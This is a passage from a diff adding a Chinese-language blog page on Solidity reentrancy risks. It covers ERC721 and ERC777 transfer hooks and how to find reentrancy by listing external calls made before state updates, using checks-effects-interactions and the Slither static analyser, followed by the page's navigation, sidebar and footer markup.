bytes calldata operatorData</span><br><span class="line">&gt;) external;</span><br></pre></td></tr></table></figure>
+
+<p>这些hook函数在ERC777代币转移过程中提供了更多的控制和定制性，但与此同时，也引入了潜在的重入攻击风险，因为这些函数可以在转移代币的过程中被自动调用，如果不正确实现，可能会被利用进行恶意操作。</p>
+<p>总的来说，无论是ERC721的<code>onERC721Received</code>函数，还是ERC777的<code>tokensToSend</code>和<code>tokensReceived</code>函数，它们都是在资产转移过程中提供额外行为的hook函数，开发者在实现这些函数时需要谨慎，确保考虑到了重入攻击的防护。</p>
+</blockquote>
+<p>对于 ERC721：他可能将交易的执行权转移给任意地址的外部调用，当可能有状态尚未被更新时他可能出现问题</p>
+<p>对于 ERC777：它是因为暴露了回调函数，可能会将交易的执行权交给发出地址或目的地址</p>
+<h2 id="检测重入问题的方法"><a href="#检测重入问题的方法" class="headerlink" title="检测重入问题的方法"></a>检测重入问题的方法</h2><p>到目前为止，我们注意到<strong>重入漏洞的根本原因始终是一个任意的外部调用</strong>。他特别集中在<strong>状态变量在此调用之前没有被更新的情况</strong>。这就是为什么<strong>检查-效果-交互</strong>为什么这么有效。</p>
+<p><strong>所以，我们要确保在我们进行交互和外部调用之前更新每一个状态。</strong></p>
+<p>我们可以简单的列举系统发出的每一个外部调用，特别是那些发给不受信任账户或任意地址的调用。特别是那些在状态变量更新之前发生的调用。可以使用 Slither 等静态分析工具来列举这些在状态变量之前发出的外部调用</p>
+<p>获取完这个列表后，还需要一个另外的列表：有人在控制交易执行的时候，可以控制的调用，这将是系统中可以发出的任何外部调用，以及在交易执行时，那个时候过时的每一个状态。<strong>所以列出每一个失去时效的状态变量，包括那些对于每一个风险的外部调用</strong></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Q1ngying
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2024/03/30/%E9%87%8D%E5%85%A5/" title="重入">http://example.com/2024/03/30/重入/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Solidity/" rel="tag"># Solidity</a>
+              <a href="/tags/Security/" rel="tag"># Security</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/03/29/%E6%B5%81%E5%AF%86%E7%A0%81/" rel="prev" title="流密码">
+      <i class="fa fa-chevron-left"></i> 流密码
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%8F%E5%85%B8%E9%87%8D%E5%85%A5%E9%97%AE%E9%A2%98%EF%BC%88Classic-Reentrancy%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">经典重入问题（Classic Reentrancy）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%A8%E5%87%BD%E6%95%B0%E9%87%8D%E5%85%A5%E9%97%AE%E9%A2%98%EF%BC%88Cross-Function-Reentrancy%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">跨函数重入问题（Cross-Function Reentrancy）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%A8%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E9%97%AE%E9%A2%98%EF%BC%88Cross-Contract-Reentrancy%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">跨合约重入问题（Cross-Contract Reentrancy）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%AA%E8%AF%BB%E9%87%8D%E5%85%A5%E9%97%AE%E9%A2%98%EF%BC%88Read-Only-Reentrancy%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">只读重入问题（Read-Only Reentrancy）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ERC721-ERC777%E9%87%8D%E5%85%A5%E9%97%AE%E9%A2%98"><span class="nav-number">5.</span> <span class="nav-text">ERC721&amp;ERC777重入问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ERC721"><span class="nav-number">5.1.</span> <span class="nav-text">ERC721</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ERC777"><span class="nav-number">5.2.</span> <span class="nav-text">ERC777</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E9%87%8D%E5%85%A5%E9%97%AE%E9%A2%98%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">6.</span> <span class="nav-text">检测重入问题的方法</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Q1ngying"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Q1ngying</p>
+  <div class="site-description" itemprop="description">今朝梦醒与君别，遥盼春风寄相思</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/q1ngying" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;q1ngying" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:q1ngying@163.com" title="E-Mail → mailto:q1ngying@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2023-09 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Q1ngying</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">153k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">8:31</span>
+</div>
+
+<div class="powered-by">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <i class="fa fa-user-md"></i>
+    <span id="busuanzi_container_site_uv">
+        本站访客数:<span id="busuanzi_value_site_uv"></span>人
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_pv">
+        本站访问量<span id="busuanzi_value_site_pv"></span>人次
+    </span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='255,255,255' opacity='1' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
